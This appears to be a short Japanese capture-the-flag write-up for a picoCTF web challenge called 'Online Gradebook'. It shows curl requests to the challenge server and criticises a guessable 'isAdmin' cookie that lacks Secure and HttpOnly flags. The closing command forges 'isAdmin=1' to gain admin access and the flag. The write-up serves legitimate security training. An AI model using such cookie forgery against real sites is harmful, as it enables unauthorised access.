```bash
curl -i http://saturn.picoctf.net:61304/
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 09 May 2022 14:51:19 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Secure Log In</title>
  </head>
  <body>
    <script src="guest.js"></script>

    <h1>Online Gradebook</h1>
    <button type="button" onclick="continueAsGuest();">Continue as guest</button>
  </body>
</html>
```

この時点ではクッキーは設定されていない。  
``continueAsGuest()``を定義しているであろう``guest.js``を見てみる。  

```bash
$ curl http://saturn.picoctf.net:61304/guest.js



function continueAsGuest()
{
  window.location.href = '/check.php';
  document.cookie = "isAdmin=0";
}
```

あーこれはいけない。クッキー値がランダムなトークンじゃないから推測できるし、（そもそもhttpsじゃないが）``Secure``属性も``HttpOnly``もなにもかも設定していない。  

以下でフラグを取得。  

```bash
$ curl -H 'Cookie: isAdmin=1' http://saturn.picoctf.net:61304/check.php
```
